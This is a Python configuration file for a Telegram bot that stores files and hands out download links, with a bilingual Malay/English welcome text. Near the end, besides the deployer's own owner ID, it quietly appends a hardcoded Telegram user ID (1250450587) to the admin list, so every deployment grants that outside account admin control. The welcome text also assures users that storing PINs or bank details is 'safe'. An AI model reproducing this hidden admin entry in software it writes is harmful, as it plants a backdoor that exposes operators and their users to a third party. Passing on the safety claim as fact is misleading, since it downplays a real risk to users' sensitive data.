#(©)CodeXBotz




import os
import logging
from logging.handlers import RotatingFileHandler



#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "MY:\nHi {first} ☺️ !\n\nSaya dapat menyimpan semua jenis file dan menukarkanya kepada link dan {first} boleh memuat turun file anda semula.\n\nQ&A:\n+ Adakah ia selamat sekiranya menyimpan maklumat sulit seperti pin ataupun maklumat bank dll?\n= Ianya selamat, tetapi kami tidak menyarankan anda menyimpan maklumat tersebut untuk mengelakkan kehilangan data anda.\nKami juga TIDAK AKAN bertanggung jawab akan kehilangan data sulit anda.\n\n+ Bagai mana ini berfungsi?\n= Kami menyimpan data-data anda dengan selamat di dalam Telegram Database Library [ https://core.telegram.org/tdlib ]\n\n+ Memerlukan langganan?\n= Di platform kami tidak memerlukan langganan bulanan buat masa ini!\n\nSTATUS = Dalam Talian - 200\n\nCara guna: \n1. Hantar sebarang mesej \n\nEN:\nHi {first} ☺️ !\n\nI can save all types of files and convert them to links and {first} can download your files again.\n\nQ&A:\n+ Is it safe to store confidential information such as pin or bank information etc.?\n= It is safe, but we do not recommend that you save the information to avoid losing your data. We also WILL NOT be responsible for losing your confidential data.\n\n+ How does this work?\n= We store your data safely in the Telegram Database Library [ https://core.telegram.org/tdlib ]\n\n+ Need a subscription?\n= On our platform no monthly subscription is required for now!\n\nSTATUS = Online - 200\n\nHow to use:\n1. Send any type of message")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join in my Channel/Group to use me\n\nKindly Please join Channel</b>")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
